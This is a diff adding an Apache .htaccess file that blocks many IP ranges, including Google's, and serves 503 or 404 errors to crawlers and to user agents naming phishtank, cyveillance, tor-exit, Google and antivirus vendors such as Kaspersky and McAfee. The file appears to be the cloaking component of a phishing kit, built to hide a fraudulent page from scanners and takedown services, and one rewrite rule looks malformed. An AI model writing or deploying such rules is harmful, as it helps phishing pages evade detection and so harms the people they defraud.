@@ -1,0 +1,181 @@
+<IfModule mod_headers.c>
+	Header set Cache-Control "no-cache, no-store, must-revalidate"
+	Header set Pragma "no-cache"
+	Header set Expires 0
+</IfModule>
+
+deny from 207.189.31.177
+deny from 139.28.218.174
+deny from 5.181.233.28
+deny from 72.12.194.90
+deny from 72.12.194.91
+deny from 72.12.194.92
+deny from 72.12.194.93
+deny from 72.12.194.94
+deny from 66.102.
+deny from 38.100.
+deny from 107.170.
+deny from 149.20.
+deny from 38.105.
+deny from 74.125.
+deny from 66.150.14.
+deny from 54.176.
+deny from 38.100.
+deny from 184.173.
+deny from 66.249.
+deny from 128.242.
+deny from 72.14.192.
+deny from 208.65.144.
+deny from 74.125.
+deny from 209.85.128.
+deny from 216.239.32.
+deny from 74.125.
+deny from 207.126.144.
+deny from 173.194.
+deny from 64.233.160.
+deny from 72.14.192.
+deny from 66.102.
+deny from 64.18.
+deny from 194.52.68.
+deny from 194.72.238.
+deny from 62.116.207.
+deny from 212.50.193.
+deny from 69.65.
+deny from 69.65.
+deny from 50.7.
+deny from 131.212.
+deny from 46.116.
+deny from 62.90.
+deny from 89.138.
+deny from 82.166.
+deny from 85.64.
+deny from 212.235.
+deny from 217.132.
+deny from 50.97.
+deny from 217.132.
+deny from 209.85.
+deny from 66.205.64.
+deny from 204.14.48.
+deny from 64.27.2.
+deny from 67.15.
+deny from 202.108.252.
+deny from 193.47.80.
+deny from 64.62.136.
+deny from 66.221.
+deny from 64.62.175.
+deny from 198.54.
+deny from 192.115.134.
+deny from 216.252.167.
+deny from 193.253.199.
+deny from 69.61.12.
+deny from 64.37.103.
+deny from 38.144.36.
+deny from 64.124.14.
+deny from 206.28.72.
+deny from 209.73.228.
+deny from 158.108.
+deny from 168.188.
+deny from 66.207.120.
+deny from 167.24.
+deny from 192.118.48.
+deny from 67.209.128.
+deny from 12.148.209.
+deny from 12.148.196.
+deny from 193.220.178.
+deny from 72.12.194.90
+deny from 70.113.252.69
+deny from 72.12.194.91
+deny from 72.12.194.94
+deny from 72.12.194.93
+deny from 209.19.170.53
+deny from 70.113.252.69
+deny from 196.153.199.192
+deny from 191.254.76.13
+deny from 177.69.113.193
+deny from 134.209.33.65
+deny from 52.44.111.223
+deny from 173.189.51.196
+deny from 172.249.201.97
+deny from 188.166.98.249
+deny from 185.253.96.10
+deny from 103.208.220.141
+deny from 156.201.78.99
+deny from 156.201.65.206
+deny from 74.79.70.234
+deny from 73.130.110.16
+deny from 70.113.252.69
+deny from 199.229.249.186
+deny from 134.209.33.65
+deny from 174.216.21.218
+deny from 191.109.106.35
+deny from 70.32.0.80
+deny from 197.41.9.221
+deny from 41.36.4.149
+deny from 172.58.20.57
+deny from 47.180.6.169
+deny from 82.102.27.54
+deny from 87.113.138.214
+deny from 165.73.248.92
+deny from 185.107.70.202
+deny from 65.35.27.220
+deny from 161.129.66.231
+deny from 70.175.75.109
+deny from 41.239.20.233
+deny from 50.98.218.95
+deny from 76.64.128.247
+deny from 172.97.186.89
+deny from 73.169.222.68
+deny from 89.36.122.213
+deny from 73.245.21.193
+deny from 70.32.0.79
+deny from 52.44.111.223
+deny from 107.182.230.240
+deny from 47.34.121.190
+deny from 24.115.150.8
+deny from 45.19.15.210 
+deny from 24.50.75.2
+deny from 173.181.106.152
+deny from 70.32.0.80
+deny from 41.46.150.50
+deny from 199.229.249.186
+deny from 172.222.185.202
+deny from 73.100.82.194
+deny from 37.230.170.16
+deny from 91.207.175.215
+deny from 97.118.154.69
+deny from 174.196.41.230
+deny from 71.92.34.93
+deny from 68.108.41.6
+deny from 70.113.252.69
+deny from 174.48.199.158
+deny from 64.66.214.147
+deny from 103.243.173.130
+deny from 91.207.175.214
+deny from 91.207.175.215
+deny from 196.150.144.160
+deny from 142.114.127.91
+deny from 99.248.129.229
+deny from 107.182.230.239
+
+
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (Bot|Googlebot|YandexBot|bingbot|url|ruby|python|Wget|java|Apache|Client|Network|Request|TweetmemeBot|google|amazonaws|cyveillance|phishtank|dreamhost|bing|BingPreview|netpilot|calyxinstitute|tor-exit|bitlybot|rogerbot|Microsoft-WebDAV-MiniRedir|crawler|Spider-Pig|bitlybot|msnbot|favicon|TweetmemeBot|facebookexternalhit|ia_archiver|Ezooms|Twikle|Wotbox|UnwindFetchor|YandexImages|Pingdom|YahooSeeker/M1A1-R2D2|seo|checker|Redirect|tool|Connect|HubSpot|bot|above|google|softlayer|amazonaws|cyveillance|compatible|facebook|phishtank|dreamhost|netpilot|calyxinstitute|tor-exit|apache-httpclient|lssrocketcrawler|X11|crawler|urlredirectresolver|jetbrains|spam|acunetix|netsparker|google|007ac9|008|192.comagent|200pleasebot|360spider|4seohuntbot|50.nu|a6-indexer|admantx|amznkassocbot|aboundexbot|aboutusbot|accelobot|acoonbot|addthis.com|adsbot-google|ahrefsbot|alexabot|amagit.com|analytics|antbot|apercite|aportworm|arabot|crawl|slurp|spider|seek|accoona|acoon|adressendeutschland|ah-ha.com|ahoy|altavista|ananzi|anthill|appie|arachnophilia|arale|araneo|aranha|architext|aretha|arks|asterias|atlocal|atn|atomz|augurfind|backrub|bannana_bot|baypup|bdfetch|biglotron|bjaaland|blackwidow|blaiz|blog|blo.|bloodhound|boitho|booch|bradley|butterfly|calif|cassandra|ccubee|cfetch|charlotte|churl|cienciaficcion|cmc|collective|comagent|combine|computingsite|csci|curl|cusco|daumoa|deepindex|delorie|depspid|deweb|digger|ditto|dmoz|docomo|dtaagent|dwcp|ebiness|ebingbong|e-collector|ejupiter|esther|ezresult|falcon|ferret|fetchrover|fido|findlinks|fireball|fouineur|funnelweb|gazz|gcreep|genieknows|getterroboplus|geturl|glx|goforit|golem|grabber|grapnel|gralon|griffon|gromit|grub|gulliver|hamahakki|harvest|havindex|helix|heritrix|homerweb|htdig|html_analyzer|htmlgobble|hubater|hyper-decontextualizer|ia_archiver|ibm_planetwide|ichiro|iconsurf|iltrovatore|image.kapsi.net|imagelock|incywincy|indexer|infobee|informant|ingrid|inktomisearch.com|intelliagent|ip3000|iron33|israeli-search|ivia|jack|jakarta|javabee|jetbot|jumpstation|katipo|kdd-explorer|kilroy|knowledge|kototoi|kretrieve|labelgrabber|lachesis|larbin|legs|libwww|linkalarm|linkscan|lockon|lwp|lycos|magpie|mantraagent|mapoftheinternet|marvin/|mattie|mediafox|mediapartners|mercator|merzscope|minirank|miva|mj12|mnogosearch|moget|monster|moose|motor|multitext|muncher|muscatferret|mwd.search|myweb|najdi|nameprotect|nationaldirectory|nazilla|nec-meshexplorer|nederland.zoek|netmechanic|netresearchserver|netscoop|newscan-online|nhse|nokia6682/|nomad|noyona|nutch|nzexplorer|objectssearch|occam|omni|openfind|openintelligencedata|osis-project|pageboy|pagebull|page_verifier|panscient|parasite|partnersite|patric|pear.|pegasus|peregrinator|phantom|phpdig|picosearch|piltdownman|pimptrain|pinpoint|pioneer|piranha|plumtreewebaccessor|pogodak|poirot|pompos|poppelsdorf|poppi|psycheclone|publisher|python|rambler|roach|roadhouse|robbie|robofox|robozilla|rules|salty|sbider|scooter|scoutjet|scrubby|search.|searchprocess|semanticdiscovery|senrigan|sg-scout|shai'hulud|shark|shopwiki|sidewinder|sift|silk|simmany|sitetech-rover|skymob.com|sleek|smartwit|sna-|snappy|snooper|sohu|speedfind|sphere|sphider|spinner|spyder|steeler/|suke|suntek|supersnooper|surfnomore|sven|sygol|szukacz|tarantula|templeton|/teoma|t-h-u-n-d-e-r-s-t-o-n-e|theophrastus|titan|titin|tkwww|toutatis|t-rex|tutorgig|twiceler|twisted|ucsd|udmsearch|updated|vagabondo|valkyrie|verticrawl|victoria|vision-search|volcano|voyager/|voyager-hc|w3c_validator|w3m2|w3mir|walker|wallpaper|wanderer|wauuu|wavefire|webbandit|webcatcher|webcopy|webfoot|weblayers|weblinker|webmirror|webmonkey|webquest|webreaper|websitepulse|websnarf|webstolperer|webvac|webwalk|webwatch|webwombat|webzinger|wget|whizbang|whowhere|worldlight|wwwc|wwwster|xenu|xift|xirq|yandex|yanga|yeti|yahoo!) [NC]
+RewriteRule .* - [R=503,L]
+
+RewriteCond %{REMOTE_ADDR} ^-?$ [OR]
+RewriteCond %{HTTP_USER_AGENT} ^-?$ [OR]
+RewriteCond %{HTTP_USER_AGENT} ^.*(X11|CriOS|Spider|Google|yahoo|bot|Amazon|InfoRelay|Eurafibre|SAS|Bitdefender|AVAST|McAfee|Kaspersky|OVH|Leaseweb|DigitalOcean|China|SoftLayer|Cyren|Defense|itlybot|compatible).*$ [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} ^.*(Windows\ NT\ 6\.1;\ WOW64).*$ [OR]
+RewriteCond %{HTTP_USER_AGENT} ^.*(Windows\ NT\ 6\.3;\ WOW64).*$ [OR]
+RewriteCond %{HTTP_USER_AGENT} ^.*(Windows\ NT\ 5\.1).*$ [OR]
+RewriteCond %{HTTP_USER_AGENT} ^.*(dfgdfgdf).*$
+
+ RewriteRule (.*) [R=404,L]
+
+#RewriteRule (.*) index.php?request_method=%1 [R=302,L]
+</IfModule>
+
+Options All -Indexes
+DirectoryIndex index.php
